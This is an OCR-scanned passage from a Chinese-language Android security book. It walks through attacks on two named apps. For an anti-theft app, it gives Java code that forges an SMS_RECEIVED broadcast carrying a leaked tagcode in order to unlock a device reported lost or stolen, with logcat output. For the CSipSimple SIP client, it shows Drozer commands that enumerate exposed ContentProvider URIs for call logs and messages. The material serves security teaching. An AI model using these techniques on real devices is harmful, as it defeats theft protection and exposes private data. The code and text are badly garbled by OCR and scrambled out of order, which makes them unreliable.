processUnLockMsg (Landroid/content/Context: Ljava/uti1/Vector:)V: 60
settings=Landroid/app/SharedPreferencesImp1; 
smsTokens=Ljava/uti1/Vector; 
thig=Lcom/yougetitback/androidapplication/SmsIntentReceiver;
TYPELOCK=L
YGIBTAG=TAG:
TAG=AAA
context=Landroid/app/ReceiverRestrictedContext; 
-- setting=
最终你可以看到你所寻找的共享配置键值tagcode，这进一步证实了你在静态分析中识别到
---
## Page 111
4.2案例分析：移动安全应用
95
的结果。这也再次对应到之前泄露的日志消息，这里tagCode之后会跟随着一个数字形式的字符
串。了解到这些信息之后，你知道我们的短信实际上需要包含YGIB：U以及一个空格和tagcode
值，在本例中即YGIB：U 137223048617183。
4.2.4攻击
尽管可以向目标设备发送你特意构造的短信，但是只是知道tagcode值仍然可能不够，因为
其他设备（甚至是任意设备）的tagcode值很可能不同。为此，你还需要获取到日志中泄露的值，
而这可以通过在概念验证攻击应用中申请READ_LOG权限获得。
知道了这个tagCode的值之后，向目标设备发送一条YGIB：U137223048617183格式的简
单短信，就可以触发应用的解锁组件。甚至，你可以进一步在你的概念验证攻击应用中伪造
SMS_RECEIVED 广插。因为发送个隐式的 SMS_RECEIVEDIntent需要 SEND_SMS_BROADCAST
权限，而这一权限只限于系统应用，所以只能显式地指定发给目标应用中的BroadcastReceiver。
短信协议数据单元（PDU）的整体结构构成超出本章的范围，我们将在第11章中介绍一些细节，
但在以下代码片段中，我们给出了伪造包含短信Intent的相关代码。
byte[1 pdu = nu11;
byte[] scBytes = PhoneNunberUti1s.networkPortionToCalledPartyBCD(*
1(.0000000000
byte[] senderBytes =
PhoneNunberUti1s,networkPortionToCalledPartyBCD (sender) :
byte [] dateBytes = nev byte [7];
int 1smcs = scBytes.1ength;
Calendar calendar = nev GregorianCalendar ():
dateBytes [0] = reverseByte ((byte)(calendar.get (Calendar.YEAR))) ;
Calendar,MONrH) + 111;
dateBytes [1] = reverseByte ((byte) (calendar.get (
dateBytes [2] · reverseByte ((byte)(calendar-get (
Calendar .DAY_OF_MONrH) 11 :
dateBytes [3] = reverseByte ((byte)(calendar.get (
Calendar .HOUR_oF_DAY) 1) :
GateBytes [4]
- reverseByte ((byte)(calendar.get(
Calendar .HINUTg) >1:
dateBytes [5]
)= reverseByte ((byte)(calendar.get(
Calendar.SECOND) )1;
dateBytes [6]= reverseByte ((byte)((calendar,get (
Calendar -ZONE_OFFSEr) + calendar
try
ByteArrayOutputStream bo = new ByteArrayOutputStream () :
bo.write (scBytes) :
bo .write(1sncs) ;
bo.write( (byte)sender .1ength (11 :
bo.write(0x04) ;
bo.vrite (senderBytes);
---
## Page 112
96第4章云计算的安全风险
bo.write (0x00): // encoding : 0 for default 7bit
bo,write (0x00);
bo,write (dateBytes) 1
Kx1
*com.android.internal.telephony .GsmAlphabet*;
String sReflectedClassName *
Method stringToGsn7BitPacked = cReflectedNFCExtras getMethod (
Class cReflectedNFCExtras = Class.forName (sReflectedClassName) ;
"stringToGsn7BitPacked*, new Class[] ( String.elass 1):
stringToGsm7BitPacked, setAccessible(true) ;
nu11,body) 1
byte[] bodybytes = (byte[1) stringToGsm7BitPacked.invoke (
bo.write (bodylbytes) :
 1 1
pdu = bo.toByteArray();
Intent setComponent (new ComponentName ( *com.youget itback.
Intent intent = new Intent():
androidapplication.virgin.mobile*,
*com.yougetitback androidapplication.SmsIntentReceiver*));
intent .setAction(*android.provider,Telephony .SMS_RECEIVED*) :
intent .putExtra(*pdus*, new Object[] ( pdu )) :
intent -putExtra(*format*, *3gpp*)1
context sendorderedBroadcast (intent,nu11) :
这段代码首先构建了短信PDU，包括YGIB：U命令、tagcode值、发送者的号码，以及其他
相关的PDU属性值。然后使用反射机制来调用stringToGsm7BitPacked方法，将PDU主体
包装到适当的表示中，而表示PDU主体的字节数组随后被放置到pdu对象中。接下来，创建出
一个Intent对象，将目标组件设置为应用的短信接收器，将动作设置为SMS_RECEIVED。然后设
置一些extra的属性值，其中最为重要的是将pdu对象增加到使用"pdus"键值的extra域。最后，
调用sendOrderdBroadcast方法将构造的Intent发送出去，就可以引导目标应用来解锁设备。
为了演示这一效果，以下代码显示了设备被解锁时的1ogcat输出（在本例中通过短信，面
1234是用户用来锁定设备的PIN码）。
I/MessageListener: (14008) : 1234
I/FindLocationService (14008) : PindLocationService created!11
D/PORBGROUNDSERVICE (14008) : onCreate
D/FORBGROUNDSERVICE (14008) 1 onStartComnand
D/SIR&NSERVICE(14008) : onStartCommand
D/SIR&NSERVICE(14008) : onCreate
I/LockAcknowledgeService(14008) : LockAcknowledgeService created!11
I/ActivityManager (13738) : STARr (act=android.intent action.VIEW
I/FindLocationService (14008) : FindLocationService stopped111
cat=[test.foobar.123] f1g=0x10000000
cnp=com.yougetitback, androidapp1icat1on.v1rgin.mobi1e/
com.yougetitback.androidapp1ication.Splashscreen u=0) from pid 14008
图47显示了锁定设备的屏幕截图
---
## Page 113
4.3案例分析：SIP客户端
97
LOCKED
REPORTED AS LOST/STOLEN
Touch screenfor op
图4-7应用锁定设备的屏幕截图
你的应用在运行时会发送一个特殊构造的短信来解锁这个设备，你会看到如下的1ogcat
输出：
I/Mes8ageListener : (14008) : YGIB:U TAG:136267293995242
V/SWIPBwIPg(14008) : recieved unlock message
D/PORBGROUNDSERVICE(14008) : onDestroy
I/ActivityManager (13738) : START (act=android.intent ,action.VIEH
cat=[test.foobar.123] f1g=0x10000000
cmp=com.yougetitback,androidapplication.virgin.mobile/
com-yougetitback. androidapplication.SplashScreen (has extras) u=0)
D/SIRENSERVICE(14008) : onDestroy
from pid 14008
I/UnloekAcknowledgeService (140o8) : UnlockAcknowledgeService created111
I/UnlockAcknowledgeService (14008) : UnlockAcknowledgeService stopped!!1
运行完成后，你将再次得到一个被解锁的设备。
4.3案例分析：SIP客户端
这个简要的案例分析会向你展示：如何发现一个未经保护的ContentProvider，并从中获取可
能的敏感数据。在这个案例中，分析的应用是CSipSimple，一个流行的会话初始协议（SIP）客
户端。与上个案例详细分析应用的方法不同，这里我们将使用另一种快捷简单的动态分析技术。
--i
4.3.1了解Drozer
Drozer（原名Mercury）是由MWR实验室开发的一款可扩展的模块化Android安全测试框
---
## Page 114
98第4章云计算的安全风险
架。它使用一个在目标设备上运行的代理应用和一个基于Python的远程终端，测试者可以在远
程终端上发出一些测试指令。它具有许多功能模块，支持如获取应用信息、发现未经保护的IPC
接口和攻击设备等操作。默认情况下，它以只有INTERNET权限的标准应用用户身份运行。
4.3.2发现漏洞
在Drozer配置完毕和运行之后，你可以快速地识别出CSipSimple应用导出的ContentProvider
URI，以及它们的权限要求。运行app·provider，info模块，传递-a com.csipsimple作为
参数可以限定只对目标应用进行扫描：
dz> run app-provider.info -a con.csipsimple
Package: com.csipsinp1e
Authority: com,csipsinple.prefs
Read Permission: android.permission.CONFIGURE_SIP
Write Permission: android.permission.CoNPIGUR8_SIP
Multiprocess Allowed: False
Authority: com,csipsinple.db
Grant Uri Permissions: False
Read Permission: android.permission.CoNFIGURE_SIP
Write Permission: android.permission.CoNPIGUR&_SIP
Grant Uri Permissions: False
Multiprocess A1lowed: False
为了与这些ContentProvider接口进行交互，必须拥有android，permission.CONPIGURE
SIP权限。然面这并不是标准的Android权限，面是由 CSipSimple声明的自定义权限，你可以在
CSipSimple 的 Manifest 文件中找到权限声明。运行app.package.manifest，并将程序包名作
为唯一参数传递，这可以获取到整个Manifest文件，以下输出结果对其进行了删减，只显示了相
关信息。
dz> run app -package.manifest com.csipsinple
 1 1
级别会提示用户在安装时接受权限，大多数情况下用户会照做）。然而，由于没有指定Signature
或者signatureOrSystem级别，其他应用也可以申请这个权限。默认情况下，Drozer的代理
应用并没有这一权限，但是通过修改Manifest文件和重建代理APK应用，可以非常轻易地获取
这一权限。
在重新制作一个具有CONFIGURE_SIP权限的Drozer代理之后，你就可以开始查询这些
Content Provider接口了。你可以从发现CSipSimple所暴露的Content Provider URI着手，为此，
你需要运行名为app.provider，finduris的模块：
---
## Page 115
4.3案例分析：SIP客户端
99
dz> run app -provider finduri com,csipsinple
Scanning com,csipsinple...
content: //com,csipsinple-prefs/raz
content: //com.csipsimple.db/
content1//com. csipsimple.db/ca111ogs
content : //com. csipsimp1e.db/outgoing_fi1ters
content : //com,csipsinple.db/accounts/
content 1 / /con, csipsirple, db/accounts_status/
content : //eom.android.contacts/contacts
r + 1
4.3.3 snarfing
查询结果给我们提供了许多选项，包括一些看起来比较有意思的接口，如messages和
calllogs。查询这些Content Provider接口，首先从messages 开始，可以使用app-provider.